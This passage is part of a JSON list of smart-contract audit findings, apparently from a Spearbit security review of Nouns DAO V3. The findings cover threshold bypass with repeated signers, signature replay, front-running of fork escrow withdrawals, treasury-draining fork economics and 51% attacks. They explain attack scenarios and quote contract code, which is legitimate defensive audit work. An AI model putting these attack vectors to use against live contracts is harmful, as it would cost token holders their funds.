        "body": "The function proposeBySigs() allows users to delegate their voting power to a proposer through signatures so the proposer can create a proposal. The only condition is that the sum of the signers voting power should be higher than the proposal threshold. In the line uint256 proposalId = ds.proposalCount = ds.proposalCount + 1;, the ds.proposalCount is in- creased but the proposal has not been created yet, meaning that the NounsDAOStorageV3.Proposal struct is, at this point, uninitialized, so when the checkNoActiveProp() function is called the proposal state is DEFEATED. As the proposal state is DEFEATED the checkNoActiveProp() call would not revert in the case that a signer is repeated in the NounsDAOStorageV3.ProposerSignature[] array: function checkNoActiveProp(NounsDAOStorageV3.StorageV3 storage ds, address proposer) internal view { uint256 latestProposalId = ds.latestProposalIds[proposer]; if (latestProposalId != 0) { NounsDAOStorageV3.ProposalState proposersLatestProposalState = state(ds, latestProposalId); if ( proposersLatestProposalState == NounsDAOStorageV3.ProposalState.ObjectionPeriod || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Active || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Pending || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Updatable ) revert ProposerAlreadyHasALiveProposal(); } } Because of this it is possible to bypass the proposal threshold and create any proposal by signing multiple pro- poserSignatures with the same signer over and over again. This would keep increasing the total voting power accounted by the smart contract until this voting power is higher than the proposal threshold. Medium likelihood + Medium Impact = Medium severity. Consider NounsDAOStor-",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Attacker can utilize bear market conditions to profit from forking the Nouns DAO",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "An economic attack vector has been identified that could potentially compromise the integrity of the Nouns DAO treasury, specifically due to the introduction of forking functionality. Currently, the treasury holds approximately $24,745,610.99 in ETH and about $27,600,000 in STETH. There are roughly 738 nouns tokens. As per OpenSea listings, the cheapest nouns-token can be purchased for about 31 ETH, approximately $53,000. Meanwhile, the daily auction price for the nouns stands at approximately 28 ETH, which equals about $48,600. A prospective attacker may exploit the current bear market conditions, marked by discounted price, to buy multiple nouns-tokens at a low price, execute a fork to create a new DAO and subsequently claim a portion of the treasury. This act would result in the attacker gaining more than they invested at the expense of the Nouns DAO treasury. To illustrate, if the forking threshold is established at 20%, an attacker would need 148 nouns to execute a fork. Consider the scenario where a user purchases 148 nouns for a total of 4588 ETH (148 x 31 ether). The fork- Treasury.balance would be 2679.27 ETH, and the contract_stETH.balanceOf(forkTreasury) would stand at 3000.7 ETH. The total ETH obtained would amount to 5680.01 ETH, thereby yielding a profit of 1092 ETH ($2,024,568).",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Setting NounsAuctionHouse's timeBuffer too big is possible, which will freeze bidder's funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "It's now possible to set timeBuffer to an arbitrary big value with setTimeBuffer(), there is no control:  NounsAuctionHouse.sol#L161-L169 /** * @notice Set the auction time buffer. * @dev Only callable by the owner. */ function setTimeBuffer(uint256 _timeBuffer) external override onlyOwner { timeBuffer = _timeBuffer; emit AuctionTimeBufferUpdated(_timeBuffer); } This can freeze user funds as NounsAuctionHouse holds current bid, but the its release in conditional to block.timestamp >= _auction.endTime:  NounsAuctionHouse.sol#L96-L98 function settleAuction() external override whenPaused nonReentrant { _settleAuction(); } 29  NounsAuctionHouse.sol#L221-L234 function _settleAuction() internal { INounsAuctionHouse.Auction memory _auction = auction; require(_auction.startTime != 0, \"Auction hasn't begun\"); require(!_auction.settled, 'Auction has already been settled'); require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\"); >> auction.settled = true; if (_auction.bidder == address(0)) { nouns.burn(_auction.nounId); } else { nouns.transferFrom(address(this), _auction.bidder, _auction.nounId); } Which can be set to be arbitrary big value, say 106 years, effectively freezing current bidder's funds:  NounsAuctionHouse.sol#L104-L129 function createBid(uint256 nounId) external payable override nonReentrant { ... // Extend the auction if the bid was received within `timeBuffer` of the auction end time bool extended = _auction.endTime - block.timestamp < timeBuffer; if (extended) { >> auction.endTime = _auction.endTime = block.timestamp + timeBuffer; } I.e. permissionless settleAuction() mechanics will be disabled. Current bidder's funds will be frozen for an arbitrary time. As the new setting needs to pass voting, the probability is very low. In the same time it is higher for any forked DAO than for original one, so, while the issue is present in the V1 and V2, it becomes more severe in V3 in the context of the forked DAO. The impact is high, being long-term freeze of the bidder's native tokens.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Veto renouncing in the original DAO or rage quit blocking in a forked DAO as a result of any future proposals will open up the way for 51% attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "It is possible to renounce veto power in V1, V2 and V3 versions of the protocol or upgrade forked V1 to block or remove rage quit. While it is a part of standard workflow, these operations are irreversible and open up a possibility of all variations of 51% attack. As a simplest example, in the absence of veto functionality a majority can introduce and execute a proposal to move all DAO treasury funds to an address they control. Also, there is a related vector, incentivized bad faith voting. _burnVetoPower() exists in V1, V2 and V3: In NounsDAOLogicV1 : 30 /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower() public { // Check caller is pendingAdmin and pendingAdmin require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); address(0) _setVetoer(address(0)); } In NounsDAOLogicV2: /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower() public { // Check caller is vetoer require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); // Update vetoer to 0x0 emit NewVetoer(vetoer, address(0)); vetoer = address(0); // Clear the pending value emit NewPendingVetoer(pendingVetoer, address(0)); pendingVetoer = address(0); } In NounsDAOLogicV3: /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower(NounsDAOStorageV3.StorageV3 storage ds) public { // Check caller is vetoer require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); // Update vetoer to 0x0 emit NewVetoer(ds.vetoer, address(0)); ds.vetoer = address(0); // Clear the pending value emit NewPendingVetoer(ds.pendingVetoer, address(0)); ds.pendingVetoer = address(0); } Also, veto() was removed from NounsDAOLogicV1Fork, and the only mitigation to the same attack is rage quit():  NounsDAOLogicV1Fork.sol#L195-L222 31 /** * @notice A function that allows token holders to quit the DAO, taking their pro rata funds, * and sending their tokens to the DAO treasury. * Will revert as long as not all tokens were claimed, and as long as the delayed governance has not expired. ,! * @param tokenIds The token ids to quit with */ function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); } uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } in as an this that example function, any malfunction to forked nouns holders was previously black-listed there will be no way to stop any This means erc20TokensToIncludeInQuit, while a minority of by USDC contract, will open up the possibility of majority attack on them, i.e. majority backed malicious proposal from affecting the DAO held funds of such holders. Nouns holders that aren't aware enough of the importance of functioning veto() for original DAO and quit() for the forked DAO, can pass a proposal that renounce veto or [fully or partially] block quit(), enabling the 51% attack. Such change will be irreversible and if a majority forms and acts before any similar mitigation functionalities be reinstalled, the whole DAO funds of the rest of the holders can be lost. Per very low likelihood (which increases with the switch from veto() to quit() as a safeguard), and high funds loss impact, setting the severity to be low. if USDC is added",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The try-catch block at NounsAuctionHouseFork will only catch errors that contain strings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "This issue has been previously identified and documented in the Nouns Builder Code4rena Audit. The catch Error(string memory) within the try/catch block in the _createAuction function only catches re- verts that include strings. At present, in the current version of the NounsAuctionHouseFork there are not reverts without a string. But, given the fact that the NounsAuctionHouseFork and the NounsTokenFork contracts are meant to be upgrad- able, if a future upgrade in the NounsTokenFork:mint() replaces the require statements with custom errors, the existing catch statement won't be able to handle the reverts, potentially leading to a faulty state of the contract. Here's an example illustrating that the catch Error(string memory) won't catch reverts with custom errors that don't contain strings: contract Test1 { bool public error; Test2 test; constructor() { test = new Test2(); } function testCustomErr() public{ try test.revertWithRevert(){ } catch Error(string memory) { error = true; } } function testRequire() public{ try test.revertWithRequire(){ } catch Error(string memory) { error = true; } } } contract Test2 { error Revert(); function revertWithRevert() public{ revert Revert(); } function revertWithRequire() public { require(true == false, \"a\"); } }",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Private keys are read from the .env environment variable in the deployment scripts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "It has been identified that the private key of privileged (PROPOSER_KEY and DEPLOYER_PRIVATE_KEY) accounts are read the environment variables within scripts. The deployer address is verified on Etherscan as Nouns DAO: Deployer. Additionally, since the proposal is made by the account that owns the PROPOSER_KEY, it can be assumed that the proposer owns at least some Nouns. ProposeENSReverseLookupConfigMain- ProposeDAOV3UpgradeMainnet.s.sol#L24, Given the privileged status of the deployer and the proposer, unauthorized access to this private key could have a negative impact in the reputation of the Nouns DAO. The present method of managing private keys, i.e., through environment variables, represents a potential security risk. This is due to the fact that any program or script with access to the process environment can read these variables. As mentioned in the Foundry documentation: This loads in the private key from our .env file. Note: you must be careful when exposing private keys in a .env file and loading them into programs. This is only recommended for use with non-privileged deployers or for local / test setups. For production setups please review the various wallet options that Foundry supports.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk DeployDAOV3NewContractsBase.s.sol#L53, DeployDAOV3DataContractsBase.s.sol#L21,"
        ]
    },
    {
        "title": "Objection period will be disabled after the update to V3 is completed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Nouns DAO V3 introduces a new functionality called objection-only period. This is a conditional voting period that gets activated upon a last-minute proposal swing from defeated to successful, affording against voters more reaction time. Only against votes will be possible during the objection period. After the proposals created in ProposeDAOV3UpgradeMainnet.s.sol and ProposeTimelockMigrationCleanup- Mainnet.s.sol are executed lastMinuteWindowInBlocks and objectionPeriodDurationInBlocks will still re- main set to 0. A new proposal will have to be created, passed and executed in the DAO that calls the _setLast- MinuteWindowInBlocks() and _setObjectionPeriodDurationInBlocks() functions to enable this functionality.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential risks from outdated OpenZeppelin dependencies in the Nouns DAO v3",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The OpenZeppelion libraries are being used throughout the Nouns DAO v3 codebase. These li- braries however, are locked at version 4.4.0, which is an outdated version that has some known vulnerabilities. Specifically:  The SignatureChecker.isValidSignatureNow is not expected to revert. However, an incorrect assumption about Solidity 0.8's abi.decode allows some cases to revert, given a target contract that doesn't imple- ment EIP-1271 as expected. The contracts that may be affected are those that use SignatureChecker to check the validity of a signature and handle invalid signatures in a way other than reverting.  The ERC165Checker.supportsInterface is designed to always successfully return a boolean, and under no circumstance revert. However, an incorrect assumption about Solidity 0.8's abi.decode allows some cases to revert, given a target contract that doesn't implement EIP-165 as expected, specifically if it returns a value other than 0 or 1. The contracts that may be affected are those that use ERC165Checker to check for support for an interface and then handle the lack of support in a way other than reverting. At present, these vulnerabilities do not appear to have an impact in the Nouns DAO codebase, as corresponding functions revert upon failure. Nevertheless, these vulnerabilities could potentially impact future versions of the codebase.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DAO withdraws forked ids from escrow without emphasizing total supply increase which contra- dicts the spec and can catch holders unaware",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Withdrawal original nouns with ids of the forked tokens from escrow after the successful fork is a material event for all original nouns holders as the adjusted total supply is increased as long as withdrawal recipient is not treasury. There were special considerations regarding Nouns withdrawal impact after the fork: For this reason we're considering a change to make sure transfers go through a new function that helps Nouners ,! understand the implication, e.g. by setting the function name to withdrawNounsAndGrowTotalSupply or something similar, as well as emitting events that indicate the new (and greater) total supply used ,! by the DAO. However, currently withdrawDAONounsFromEscrow() neither have a special name, nor mentions the increase of adjusted total supply when to != ds.timelock:  NounsDAOV3Fork.sol#L160-L178 /** * @notice Withdraws nouns from the fork escrow after the fork has been executed * @dev Only the DAO can call this function * @param tokenIds the tokenIds to withdraw * @param to the address to send the nouns to */ function withdrawDAONounsFromEscrow( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, address to ) external { if (msg.sender != ds.admin) { revert AdminOnly(); } ds.forkEscrow.withdrawTokens(tokenIds, to); emit DAOWithdrawNounsFromEscrow(tokenIds, to); } Nouns holder might not understand the consequences of withdrawing the nouns from escrow and support such a proposal, while as of now it is approximately USD 65k loss per noun withdrawn cumulatively for current holders. The vulnerability scenario here is a holder supporting the proposal without understanding the consequences for supply, as no emphasis is made, and then suffers their share of loss as a result of its execution. Per low likelihood and impact setting the severity to be low.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "USDC-paying proposals executing between ProposeDAOV3UpgradeMainnet and ProposeTimelockMi- grationCleanupMainnet will fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "As explained in one of the Known Issues, ProposeDAOV3UpgradeMainnet contains a proposal that transfers the ownership of PAYER_MAINNET and TOKEN_BUYER_MAINNET from timelockV1 to timelockV2. There could be older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet which assume timelockV1 ownership of these contracts. Older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet will fail.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Zero value ERC-20 transfers can be performed on sending treasury funds to quitting member or forked DAO, denying the whole operation if one of erc20TokensToIncludeInQuit tokens doesn't allow this",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Some tokens do not allow for zero value transfers. Such behaviour do not violate ERC-20 standard, is not anyhow prohibited and can occur in any non-malicious token. As a somewhat well-known example Aave's LEND requires amount to be positive:  etherscan.io/address/0x80fb784b7ed66730e8b1dbd9820afd29931aab03#code#L74 function transfer(address _to, uint256 _value) returns(bool) { require(balances[msg.sender] >= _value); require(balances[_to] + _value > balances[_to]); As stETH, which is currently used by Nouns treasury, is upgradable, it cannot be ruled out that it might be requiring the same in the future for any reason.  etherscan.io/token/0xae7ab96520de3a18e5e111b5eaab095312d7fe84#code Zero value itself can occur in a situation when valid token was added to erc20TokensToIncludeInFork, but this token timelock balance is currently empty. NounsDAOLogicV1Fork's quit() and NounsDAOV3Fork's executeFork() and joinFork() will be unavailable in such scenario, i.e. the DAO forking workflow will be disabled. 37 Since the update of erc20TokensToIncludeInFork goes through proposal mechanics and major tokens rarely upgrade, while there is an additional requirement of empty balance, the cumulative probability of the scenario can be deemed quite low, while the core functionality blocking impact is high, so setting the severity to be low.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A signer of multiple proposals will cause all of them except one to fail creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Like proposers, signers are also allowed to back only one proposal at a time. As commented: \"This is a spam protection mechanism to limit the number of proposals each noun can back.\" However, unlike proposers who know which of their proposals are active and when, signers may not readily have that insight and can sign multiple proposals they may want to back. If more than one such proposal is proposed then only the first one will pass the checkNoActiveProp() for this signer and all the others will fail this check and thereby the proposal creation itself. A signer of multiple proposals will cause all of them except one to fail creation. Other proposals will have to then exclude such signatures and resubmit. This could be accidental or used by malicious signers for griefing proposal creations.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step ownership change is risky",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The codebase primarily follows a two-step ownership change pattern. However, in specific sections, a single-step ownership change is utilized. Two-step ownership change is preferable, where:  The current owner proposes a new address for the ownership change.  In a separate transaction, the proposed new address can then claim the ownership.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No storage gaps for upgradeable contracts might lead to storage slot collision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "When implementing upgradable contracts that inherit it is important that there are storage gaps, in case new storage variables are later added to the inherited contracts. If a storage gap variable isn't added, when the upgradable contract introduces new variables, it may override the variables in the inheriting contract. As noted in the OpenZeppelin Documentation: You may notice that every contract includes a state variable named __gap. This is empty reserved It allows us to freely add new state space in storage that is put in place in Upgrade Safe contracts. variables in the future without compromising the storage compatibility with existing deployments. It isnt safe to simply add a state variable because it \"shifts down\" all of the state variables below in the inheritance chain.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The version string is missing from the domain separator allowing submission of signatures in different protocol versions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The version string seems to be missing from the domain separator. According to EIP-712: Protocol designers only need to include the fields that make sense for their signing domain. Unused fields are left out of the struct type While it's not a mandatory field as per the EIP-712 standard, it would be sensible for the protocol to include the version string in the domain separator, considering that the contracts are upgradable. For instance, if a user generates a signature for version v1.0, they may not want the signature to remain valid following an upgrade.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Two/three forks in a row will force expiration of execution-awaiting proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Proposal execution on the original DAO is disallowed during the forking period. While the proposed fork period is currently 7 days, MAX_FORK_PERIOD is 14 days. GRACE_PERIOD, which is the time allowed for a queued proposal to execute, has been increased from the existing 14 days to 21 days specifically to account for the fork period. However, if there are three consecutive forks whose active fork periods add up to 21 days, or two forks in the worse case if the fork period is set to MAX_FORK_PERIOD then all queued proposals will expire and cannot be executed. Malicious griefing forkers can collude to time and break-up their voting power to fork consecutively to prevent execution of queued proposal on the original DAO, thus forcing them to expire.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Withdrawing from fork escrow can be front-run to prevent withdrawal and force join the fork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "withdrawFromForkEscrow() is meant to allow a fork escrowed holder change their mind about join- ing the fork by withdrawing their escrowed tokens. However, the current design allows another fork joining holder to front-run a withdrawFromForkEscrow() transaction with their escrowToFork() to exceed the fork threshold and also call executeFork() with it (if the threshold was already met then this doesn't even have to be another fork joining holder). This will cause withdrawFromForkEscrow() to fail because the fork period is now active and that holder is forced to join the fork with their previously escrowed tokens. Scenario: Alice and Bob decide to create/join a fork with their 10 & 15 tokens respectively to meet the 20% fork threshold (assume 100 Nouns). Alice escrows first but then changes her mind and calls withdrawFromForkE- scrow(). Bob observes this transaction (assume no private mempool) and front-runs it with his escrowToFork() + executeFork(). This forces Alice to join the fork instead of staying back. withdrawFromForkEscrow() does not always succeed and is likely effective only in the early stages of escrow period but not towards the end when the fork threshold is almost met. Late fork escrowers do not have as much an opportunity as others to change their mind about joining the fork.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A malicious proposer can replay signatures to create duplicate proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Suppose Bob and Alice sign a proposal for Carl, authorizing a transfer of exactly 100,000 USDC to a specified address (xyz) and their signatures were created with a long expiration time. Following the normal procedure, Carl creates the proposal, the vote is held, and the proposal enters the 'succeeded' state. However, since Bob and Alice's signatures are still valid due to the long expiration time, Carl could reuse these signatures to create another proposal for an additional transfer of 100,000 USDC to the same xyz address, as long as Bob and Alice still retain their voting power/nouns. Thus, Carl could double the intended transfer amount without their explicit authorization. While it is true that Bob and Alice can intervene by either cancelling the new proposal or invalidating their signatures before the creation of the second proposal, it necessitates them to take action, which may not always be feasible or timely.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential re-minting of previously burnt NounsTokenFork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of the NounsTokenFork contract, there is a potential vulnerability that allows for a previously burned NounsTokenFork to be re-minted. This risk occurs due to the user retaining the status of escrow.ownerOfEscrowedToken(forkId, nounId) even after the claimFromEscrow() function call. Presently, no tokens are burned outside of the NounsAuctionHouseFork and are only burned in the case that no bids are placed for that nounId. However, this issue could become exploitable under the following circumstances: 1. If a new burn() functionality is added elsewhere in the code. 2. If a new contract is granted the Minter role. 3. If the NounsAuctionHouseFork is updated to a malicious implementation. Additionally, exploiting this potential issue would lead to the remainingTokensToClaim variable decreasing, caus- ing it to underflow (<0). In this situation, some legitimate users would be unable to claim their tokens due to this underflow.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A single invalid/expired/cancelled signature will prevent the creation and updation of proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "For proposals created via proposeBySigs() or updated via updateProposalBySigs(), if the pro- poser includes even a single invalid/expired/cancelled signature (without performing offchain checks to prevent this scenario), verifyProposalSignature() will revert and the creation/updation of proposals will fail. NounsDAOV3Proposals.sol#L815 Nouns- A proposer accidentally including one or more invalid/expired/cancelled signatures submitted accidentally by a signer will cause the proposal creation/updation to fail, lose gas used and will have to resubmit after checking and excluding such signatures. This also allows griefing by signers who intentionally submit an invalid/expired signature or a valid one which is later cancelled (using cancelSig()) just before the proposal is created/updated. Note that while the signers currently have cancellation powers which gives them a greater griefing opportunity even at later proposal states, that has been reported separately in a different issue.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk NounsDAOV3Proposals.sol#L956-L962"
        ]
    },
    {
        "title": "Missing require checks in NounsDAOV3Proposals.execute() and executeOnTimelockV1() functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The following require checks are missing:  FunctionNounsDAOV3Proposals.execute(): require(proposal.executeOnTimelockV1 == false, 'NounsDAO::execute: executeOnTimelockV1 = true');  Function NounsDAOV3Proposals.executeOnTimelockV1(): require(proposal.executeOnTimelockV1 == true, 'NounsDAO::executeOnTimelockV1: executeOnTimelockV1 = ,! false'); Due to the absence of these require checks, the NounsDAOLogicV3 contract leaves open a vulnerability where if two identical proposals, with the exact same transactions, are concurrently queued in both the timelockV1 and timelock contracts, the proposal originally intended for execution on timelock can be executed on timelockV1 and vice versa. The consequence of this scenario is that it essentially blocks or causes a Denial of Service to the legitimate execution path of the corresponding proposal for either timelockV1 or timelock. This occurs because each proposal has been inadvertently executed on the unintended timelock contract due to the lack of a condition check that would otherwise ensure the correct execution path.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Due to misaligned DAO and Executors logic any proposal will be blocked from execution at 'eta + GRACE_PERIOD' timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "There is an inconsistency in treatment of the eta + GRACE_PERIOD moment of time in the proposal lifecycle: any proposal is executable in timelock at this timestamp, but have expired status in the DAO logic. Both Executors do allow the executions when block.timestamp == eta + GRACE_PERIOD: The NounsDAOExecutor:executeTransaction() function: 43 function executeTransaction( address target, uint256 value, string memory signature, bytes memory data, uint256 eta ) public returns (bytes memory) { ... require( getBlockTimestamp() >= eta, \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\" ); require( getBlockTimestamp() <= eta + GRACE_PERIOD, 'NounsDAOExecutor::executeTransaction: Transaction is stale.' ); The NounsDAOExecutorV2:executeTransaction() function: function executeTransaction( address target, uint256 value, string memory signature, bytes memory data, uint256 eta ) public returns (bytes memory) { ... require( getBlockTimestamp() >= eta, \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\" ); require( getBlockTimestamp() <= eta + GRACE_PERIOD, 'NounsDAOExecutor::executeTransaction: Transaction is stale.' ); While all (V1,2, 3, and V1Fork) DAO state functions produce the expired state. The NounsDAOLogicV2:state() function: function state(uint256 proposalId) public view returns (ProposalState) { require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); Proposal storage proposal = _proposals[proposalId]; if (proposal.vetoed) { return ProposalState.Vetoed; } else if (proposal.canceled) { return ProposalState.Canceled; } else if (block.number <= proposal.startBlock) { return ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return ProposalState.Active; } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < ,! quorumVotes(proposal.id)) { return ProposalState.Defeated; } else if (proposal.eta == 0) { return ProposalState.Succeeded; } else if (proposal.executed) { return ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) { return ProposalState.Expired; 44 The NounsDAOV3Proposals:stateInternal() function: function stateInternal(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) internal view returns (NounsDAOStorageV3.ProposalState) { require(ds.proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId]; if (proposal.vetoed) { return NounsDAOStorageV3.ProposalState.Vetoed; } else if (proposal.canceled) { return NounsDAOStorageV3.ProposalState.Canceled; } else if (block.number <= proposal.updatePeriodEndBlock) { return NounsDAOStorageV3.ProposalState.Updatable; } else if (block.number <= proposal.startBlock) { return NounsDAOStorageV3.ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return NounsDAOStorageV3.ProposalState.Active; } else if (block.number <= proposal.objectionPeriodEndBlock) { return NounsDAOStorageV3.ProposalState.ObjectionPeriod; } else if (isDefeated(ds, proposal)) { return NounsDAOStorageV3.ProposalState.Defeated; } else if (proposal.eta == 0) { return NounsDAOStorageV3.ProposalState.Succeeded; } else if (proposal.executed) { return NounsDAOStorageV3.ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) { return NounsDAOStorageV3.ProposalState.Expired; The NounsDAOLogicV1Fork:state() function: function state(uint256 proposalId) public view returns (ProposalState) { require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); Proposal storage proposal = _proposals[proposalId]; if (proposal.canceled) { return ProposalState.Canceled; } else if (block.number <= proposal.startBlock) { return ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return ProposalState.Active; } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < ,! proposal.quorumVotes) { return ProposalState.Defeated; } else if (proposal.eta == 0) { return ProposalState.Succeeded; } else if (proposal.executed) { return ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) { return ProposalState.Expired; Impact: Since both timelocks require sender to be admin, forced to be expired when execution call proposal).GRACE_PERIOD(). the valid proposal will be blocked from execution and time happens to be proposal.eta + getProposalTimelock(ds, The probability of this exact timestamp to be reached is low, while the impact of successful proposal to be rendered invalid by itself is high. However, since there is enough time prior to that moment both for cancellation and execution and all these actions come through permissioned workflow the impact is better described as medium, so per low probability and medium impact setting the severity to be low. 45",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A malicious DAO can increase the odds of proposal defeat by setting a very high value of last- MinuteWindowInBlocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The goal of objection-only period, as documented, is to protect the DAO from executing proposals, that the majority would not want to execute. However, a malicious majority can abuse this feature by setting a very high value of lastMinuteWindowInBlocks (setter does not enforce max threshold), i.e. something very close to the voting period, to increase the probability of triggering objection-only period. If votingPeriod = 2 weeks and a governance proposal somehow passed to set lastMin- Example scenario: uteWindowInBlocks to a value very close to 100800 blocks i.e. ~2 weeks, then every proposal may end up with an objection-only period. Impact: Every proposal may end up with an objection-only period which may not be required/expected. Low likelihood + Low impact = Low severity. 46",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use custom errors instead of revert strings and remove pre-existing unused custom errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
